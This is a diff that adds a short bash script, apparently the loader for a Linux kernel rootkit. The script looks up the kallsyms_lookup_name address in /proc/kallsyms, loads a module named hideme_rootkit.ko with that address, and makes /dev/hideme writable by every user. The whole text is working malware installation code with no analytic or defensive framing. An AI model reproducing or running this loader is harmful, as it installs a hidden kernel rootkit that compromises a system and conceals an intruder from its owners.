@@ -1,0 +1,5 @@
+#! /bin/bash
+
+addres=`cat /proc/kallsyms | grep " kallsyms_lookup_name" | awk '{print($1)}'`
+insmod hideme_rootkit.ko kallsyms_lookup_addr=0x$addres
+chmod 666 /dev/hideme
